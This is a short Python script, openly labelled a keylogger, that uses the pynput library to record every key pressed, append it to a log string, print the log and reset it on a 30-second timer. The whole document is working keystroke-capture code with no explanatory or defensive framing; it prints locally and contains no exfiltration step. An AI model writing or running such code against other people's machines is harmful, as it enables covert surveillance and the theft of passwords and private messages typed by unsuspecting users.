import pynput.keyboard
import threading

log = ""
def callback_function(key):
    global log
    try:
        log += key.char
    except AttributeError:
        if key == key.space:
            log += " "
        else:
            log += str(key)
    except:
        pass
    print(log)

keylogger_listener = pynput.keyboard.Listener(on_press = callback_function)

def threading_function():
    global log
    timer_object = threading.Timer(30,threading_function)
    print(log)
    log=""
    timer_object.start()

with keylogger_listener:
    threading_function()
    keylogger_listener.join()